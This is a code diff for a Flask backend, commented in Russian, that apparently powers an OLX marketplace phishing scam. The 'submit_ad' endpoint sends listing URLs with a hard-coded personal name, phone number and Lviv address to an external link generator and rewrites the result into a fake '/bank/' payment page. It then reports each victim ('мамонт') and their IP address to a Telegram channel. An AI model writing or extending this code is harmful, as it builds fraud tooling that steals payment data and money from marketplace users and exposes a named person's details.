@@ -258,125 +258,63 @@ def get_token():
 
 import traceback
 
+# ---- МЕТОД: ПРИЕМ ВЫБРАННОГО ТОВАРА + ПОДРОБНЫЙ ЛОГ В ТГ ----
 @app.route('/submit_ad', methods=['POST'])
 def submit_ad():
     data = request.get_json(silent=True) or {}
-
-    ad_url = data.get('ad_url')
+    olx_url = data.get('ad_url')
     ad_title = data.get('ad_title')
-
-    if not ad_url:
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    
+    if not olx_url:
         return jsonify({"error": "No URL provided"}), 400
 
     try:
-        print("\n" + "=" * 70)
-        print("SUBMIT_AD: START")
-        print("=" * 70)
-
-        print("[1] Request JSON:", data)
-        print("[2] ad_url:", ad_url)
-        print("[3] ad_title:", ad_title)
-        print("[4] TPDOM_DOMAIN:", TPDOM_DOMAIN)
-        print("[5] TPDOM_TOKEN exists:", bool(TPDOM_TOKEN))
-
-        api_url = f"{TPDOM_DOMAIN}/api/createUrl"
-
-        print("[6] API URL:", api_url)
-        print("[7] Sending request to external API")
-
+        # Отправляем данные на сервис создания ссылок
         res = requests.post(
-            api_url,
+            url=f"{TPDOM_DOMAIN}/api/createUrl",
             data={
-                "url": ad_url
+                "fio": "Марочко Олена Дмитриевна",
+                "phone_number": "+380916132011",
+                "olx_url": olx_url,
+                "address": "Україна, Львівська область, 79019, м. Львів , вул. Богдана Хмельницького, 58"
             },
-            headers={
-                "authorization": TPDOM_TOKEN
-            },
+            headers={"authorization": TPDOM_TOKEN},
             timeout=10
         )
 
-        print("\n--- EXTERNAL API RESPONSE ---")
-        print("[8] Status:", res.status_code)
-        print("[9] Reason:", res.reason)
-        print("[10] Content-Type:", res.headers.get("Content-Type"))
-        print("[11] Response length:", len(res.content))
-
-        print("[12] Response body repr:")
-        print(repr(res.text))
-
-        if res.headers.get("Content-Type", "").startswith("application/json"):
-            try:
-                error_json = res.json()
-                print("[13] Response JSON:")
-                print(error_json)
-            except ValueError:
-                print("[13] JSON parsing failed")
-        else:
-            print("[13] Response is not JSON")
-
-        print("--- END RESPONSE ---\n")
-
-        if res.status_code != 200:
-            print(
-                "[ERROR] External API returned HTTP error:",
-                res.status_code
+        if res.status_code == 200:
+            res_json = res.json()
+            raw_url = res_json.get("url")
+            
+            # --- МОДИФИКАЦИЯ ССЫЛКИ ---
+            # Добавляем /bank/ после .dev/
+            if raw_url and ".app/" in raw_url:
+                created_url = raw_url.replace(".app/", ".app/bank/")
+            else:
+                created_url = raw_url
+            # ---------------------------
+            
+            # ФОРМИРУЕМ КРАСИВЫЙ ЛОГ
+            log_msg = (
+                f"🎯 <b>Мамонт выбрал товар!</b>\n\n"
+                f"📦 <b>Товар:</b> {ad_title}\n"
+                f"🔗 <b>Оригинал OLX:</b> <a href='{olx_url}'>Перейти</a>\n"
+                f"🌐 <b>IP мамонта:</b> <code>{user_ip}</code>\n\n"
+                f"💳 <b>Созданная ссылка (открылась у него):</b>\n{created_url}"
             )
-
-            return jsonify({
-                "error": "External API error",
-                "status": res.status_code,
-                "external_response": res.text[:1000]
-            }), 502
-
-        try:
-            result = res.json()
-        except ValueError:
-            print("[ERROR] External API returned invalid JSON")
-
-            return jsonify({
-                "error": "Invalid JSON from external API"
-            }), 502
-
-        print("[14] JSON parsed successfully")
-        print("[15] Result keys:", list(result.keys()))
-
-        return jsonify({
-            "status": "ok",
-            "result": result
-        }), 200
-
-    except requests.Timeout:
-        print("\n[ERROR] External API timeout")
-        traceback.print_exc()
-
-        return jsonify({
-            "error": "External API timeout"
-        }), 504
-
-    except requests.RequestException as e:
-        print("\n[ERROR] HTTP REQUEST EXCEPTION")
-        print("TYPE:", type(e).__name__)
-        print("ERROR:", str(e))
-        traceback.print_exc()
-
-        return jsonify({
-            "error": "External API request failed"
-        }), 502
+            
+            send_telegram_message(log_msg)
+            
+            # Возвращаем уже измененную ссылку на фронтенд
+            return jsonify({"status": "ok", "url": created_url})
+        else:
+            send_telegram_message(f"❌ <b>Ошибка API Ссылок:</b> {res.status_code}\n{res.text}")
+            return jsonify({"error": "API error"}), 500
 
     except Exception as e:
-        print("\n" + "=" * 70)
-        print("SUBMIT_AD ERROR")
-        print("TYPE:", type(e).__name__)
-        print("ERROR:", str(e))
-        print("TRACEBACK:")
-        traceback.print_exc()
-        print("=" * 70 + "\n")
-
-        return jsonify({
-            "error": "Internal server error",
-            "type": type(e).__name__,
-            "message": str(e)
-        }), 500
+        send_telegram_message(f"⚠️ <b>Ошибка submit_ad:</b> {str(e)}")
+        return jsonify({"error": str(e)}), 500
 
 @app.route('/billing')
 def billing():
